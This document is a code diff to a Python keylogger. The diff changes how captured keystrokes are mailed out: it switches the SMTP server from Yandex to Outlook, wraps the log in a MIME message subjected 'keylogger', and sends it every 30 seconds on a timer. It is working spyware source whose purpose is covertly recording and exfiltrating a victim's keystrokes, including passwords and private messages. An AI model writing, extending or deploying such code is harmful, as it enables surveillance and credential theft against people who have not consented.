@@ -16,15 +16,21 @@ def callback_function(key):
         pass
 
 def send_email(email,password,text):
-    email_server = smtplib.SMTP(host='smtp.yandex.com', port=587)
+    email_server = smtplib.SMTP("smtp-mail.outlook.com",587)
     email_server.starttls()
-    email_server.login(email,password)
-    email_server.sendmail(email,email,text)
+    email_server.login(email, password)
+    msg = MIMEMultipart()
+    msg["From"] = email
+    msg["To"] = email
+    msg["Subject"] = "keylogger"
+    body = text
+    msg.attach(MIMEText(body, "plain"))
+    email_server.sendmail(email, email, msg.as_string())
     email_server.quit()
 
 def thread_function():
     global log
-    send_email("","",log.encode('utf-8'))
+    send_email("","",log)
     log = ""
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
